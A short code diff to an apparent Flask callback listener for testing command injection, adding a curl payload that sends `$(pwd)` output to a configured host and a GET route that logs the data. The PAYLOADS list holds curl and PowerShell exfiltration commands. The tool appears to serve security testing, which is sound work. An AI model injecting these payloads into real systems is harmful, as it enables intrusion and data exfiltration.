@@ -43,6 +43,7 @@ class EchoRecord:
 
 
 PAYLOADS = [
+    f"curl http://{HOST}:{PORT}/$(pwd)",
     f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
     f"pwd | powershell -Command \"Invoke-RestMethod -Uri 'http://{HOST}:{PORT}/' -Method POST -Body ([Console]::In.ReadToEnd())\"",
 ]
@@ -166,6 +167,15 @@ def show():
 @app.route("/", methods=["POST"])
 def echo():
     er = EchoRecord(request)
+    save_record(er)
+    handle_record(er)
+    return "Ok"
+
+
+@app.route("/<path:data>", methods=["GET"])
+def echo_data(data):
+    er = EchoRecord(request)
+    er.data = data
     save_record(er)
     handle_record(er)
     return "Ok"
